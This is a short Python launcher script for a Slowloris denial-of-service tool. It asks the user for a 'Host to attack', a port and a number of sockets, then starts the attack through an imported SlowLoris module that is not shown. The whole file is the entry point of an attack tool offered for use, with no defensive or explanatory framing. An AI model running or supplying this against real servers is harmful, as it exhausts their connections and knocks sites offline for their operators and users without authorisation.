from SlowLoris import SlowLoris

if __name__ == '__main__':
    target = input('Host to attack: ')
    port = int( input('Port: ') )
    sockets = int( input('Number of sockets (0 = 150 default): ') )
    if sockets == 0:
        sockets = 150

    SlowLoris.start(target, port, sockets)